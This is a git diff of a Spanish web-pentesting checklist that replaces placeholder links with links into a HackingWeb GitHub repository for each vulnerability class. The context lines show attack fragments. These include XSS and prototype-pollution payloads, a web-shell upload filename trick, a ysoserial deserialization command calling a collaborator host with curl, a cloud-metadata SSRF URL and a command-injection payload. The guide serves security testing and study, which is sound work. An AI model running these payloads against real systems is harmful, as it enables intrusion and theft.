@@ -841,7 +841,7 @@ javascript:alert(document.domain)
 
 ## 📂 File Upload
 
-> 📖 **[Más recursos sobre File Upload Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre File Upload Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/file-upload-vulnerabilities)**
 
 
 ### 1. Shell upload sin protección
@@ -1000,7 +1000,7 @@ mv imagen.jpg shell.php.jpg
 
 ## 📡 GraphQL
 
-> 📖 **[Más recursos sobre GraphQL Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre GraphQL Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/graphql-api-vulnerabilities)**
 
 
 ### 1. Detección del endpoint GraphQL
@@ -1072,7 +1072,7 @@ mv imagen.jpg shell.php.jpg
 
 ## 🍪 Gestión de sesiones
 
-> 📖 **[Más recursos sobre Session Management Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre Session Management Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/jwt)**
 
 
 ### 1. Identificación del mecanismo de sesión
@@ -1162,7 +1162,7 @@ Cookie: session=ATTACKER_CONTROLLED_VALUE
 
 ## 🌐 Host Header Attacks
 
-> 📖 **[Más recursos sobre Host Header Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre Host Header Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/http-host-header-attacks)**
 
 ### 1. Cabeceras alternativas de override de Host
 
@@ -1218,7 +1218,7 @@ Host: admin.target.com
 
 ## 🚢 HTTP Request Smuggling
 
-> 📖 **[Más recursos sobre HTTP Smuggling Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre HTTP Smuggling Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/http-request-smuggling)**
 
 > ⚠️ **Nota de precaución:** El HTTP Request Smuggling puede afectar a peticiones de otros usuarios reales de la aplicación. Extremar la precaución en entornos productivos — usar preferiblemente en ventanas de mantenimiento o entornos de staging.
 
@@ -1257,7 +1257,7 @@ SMUGGLED
 
 ## 📦 Deserialización insegura
 
-> 📖 **[Más recursos sobre Insecure Deserialization Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre Insecure Deserialization Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/insecure-deserialization)**
 
 > 💡 **Nota:** La deserialización insegura no ocurre solo en cookies — verificar también en parámetros GET/POST, cabeceras HTTP, APIs y ficheros subidos que sean deserializados en el servidor. Si el valor de una cookie parece un objeto serializado, aplicar esta sección.
 
@@ -1332,7 +1332,7 @@ java -jar ysoserial.jar CommonsCollections6 'curl https://collaborator-id.oastif
 
 ## 🍃 NoSQL
 
-> 📖 **[Más recursos sobre NoSQL Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre NoSQL Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/nosql-injection)**
 
 ### 1. Identificación del motor NoSQL
 
@@ -1413,7 +1413,7 @@ python3 nosqlmap.py
 
 ## 💻 Command Injection
 
-> 📖 **[Más recursos sobre Command Injection Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre Command Injection Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/os-command-injection)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -1568,7 +1568,7 @@ ${u=id}${u}
 
 ## 📁 Path Traversal
 
-> 📖 **[Más recursos sobre Path Traversal Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre Path Traversal Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/path-traversal)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -1738,7 +1738,7 @@ Una vez confirmado el traversal, escalar a ficheros más sensibles.
 
 ## 🧪 Prototype pollution
 
-> 📖 **[Más recursos sobre Prototype Pollution Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre Prototype Pollution Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/prototype-pollution)**
 
 > 💡 **Nota:** El impacto de Prototype Pollution depende de encontrar **gadgets** — fragmentos de código de la aplicación o de librerías que usen propiedades del prototipo contaminado para ejecutar acciones sensibles (XSS, bypass de controles, RCE en servidor).
 
@@ -1821,7 +1821,7 @@ https://target.com/?__proto__[href]=javascript:alert(1)
 
 ## 🔄 SSRF
 
-> 📖 **[Más recursos sobre SSRF Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre SSRF Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/server-side-request-forgery-ssrf)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -2006,7 +2006,7 @@ url=https://allowed-domain.com/redirect?to=http://169.254.169.254/
 
 ## 🧩 SSTI
 
-> 📖 **[Más recursos sobre SSTI Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre SSTI Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/server-side-template-injection-ssti)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -2084,7 +2084,7 @@ Una vez identificado el motor, probar ejecución de comandos:
 
 ## 💉 SQL Injection
 
-> 📖 **[Más recursos sobre SQL Injection Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre SQL Injection Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/sql-injection)**
 
 ### Nota sobre detección y explotación automática
 
@@ -2239,7 +2239,7 @@ testssl.sh --full https://target.com
 
 ## 📄 XXE
 
-> 📖 **[Más recursos sobre XXE Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre XXE Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/xml-external-entity-xxe-injection)**
 
 ### 1. Identificación de puntos de entrada
 
@@ -2435,7 +2435,7 @@ Content-Type: application/xml
 
 ## 💀 Web Cache Poisoning
 
-> 📖 **[Más recursos sobre Web Cache Poisoning Vulnerabilities](https://github.com/tu-repo/...)**
+> 📖 **[Más recursos sobre Web Cache Poisoning Vulnerabilities](https://github.com/xn4vi/HackingWeb/tree/main/web-cache-poisoning)**
 
 ### 1. Detección del sistema de caché
 
